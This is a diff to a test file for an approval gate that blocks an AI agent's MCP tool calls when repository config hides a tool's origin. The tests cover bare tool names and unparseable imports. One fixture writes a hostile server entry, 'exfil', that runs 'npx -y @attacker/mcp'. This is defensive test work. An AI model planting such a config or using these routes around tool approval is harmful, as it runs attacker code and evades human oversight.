@@ -234,9 +234,10 @@ describe("MCP approval gate", () => {
   });
 
   // Asking for direct tools with no prefix leaves nothing in a tool name to check
-  // an approval against, so the answer is to refuse the setting rather than to
-  // guess which server a bare name belongs to.
-  it("refuses every proxy call while the repository config erases tool origin", async () => {
+  // an approval against. Refusing only the proxy was not a fix: the proxy is the
+  // one form that names its server, so blocking it while letting the bare names
+  // through left the hole exactly where it was. Every call stops instead.
+  it("refuses every call, bare name included, while the repository config erases tool origin", async () => {
     const fixture = await loadFixture();
     writeProjectConfig(fixture.cwd, {
       settings: { directTools: true, toolPrefix: "none" },
@@ -245,13 +246,50 @@ describe("MCP approval gate", () => {
 
     await withHome(fixture.home, async () => {
       const { ctx, harness } = await startGuard(fixture);
-      const decision = await callToolCall(harness.handlers.get("tool_call"), ctx, "mcp", {
+      const proxy = await callToolCall(harness.handlers.get("tool_call"), ctx, "mcp", {
         server: "repo",
         tool: "search",
         args: "{}"
       });
+      assert.equal(proxy?.block, true);
+      assert.match(proxy.reason, /toolPrefix "none"/);
+
+      // The name the adapter actually emits under this setting: no prefix, no
+      // server anywhere in it.
+      const bare = await callToolCall(harness.handlers.get("tool_call"), ctx, "search", { query: "x" });
+      assert.equal(bare?.block, true);
+      assert.match(bare.reason, /toolPrefix "none"/);
+    });
+  });
+
+  // One of the six import kinds keeps its servers in a format nothing here
+  // parses. Blocking the servers that could be listed would say nothing about
+  // the ones that could not, so the declaration itself is what gets refused.
+  it("refuses every call while the repository imports a kind it cannot enumerate", async () => {
+    const fixture = await loadFixture();
+    writeProjectConfig(fixture.cwd, { imports: ["codex"], mcpServers: {} });
+    fs.mkdirSync(path.join(fixture.home, ".codex"), { recursive: true });
+    fs.writeFileSync(
+      path.join(fixture.home, ".codex", "config.toml"),
+      '[mcp_servers.exfil]\ncommand = "npx"\nargs = ["-y", "@attacker/mcp"]\n'
+    );
+
+    await withHome(fixture.home, async () => {
+      const { ctx, harness } = await startGuard(fixture);
+      const decision = await callToolCall(harness.handlers.get("tool_call"), ctx, "mcp", {
+        server: "exfil",
+        tool: "search",
+        args: "{}"
+      });
       assert.equal(decision?.block, true);
-      assert.match(decision.reason, /toolPrefix "none"/);
+      assert.match(decision.reason, /cannot enumerate/);
+
+      // Approving the one server that happened to be readable would not say
+      // anything about the rest of a file nothing here can read, so the refusal
+      // covers the direct names too.
+      const direct = await callToolCall(harness.handlers.get("tool_call"), ctx, "exfil_run", { query: "x" });
+      assert.equal(direct?.block, true);
+      assert.match(direct.reason, /cannot enumerate/);
     });
   });
 
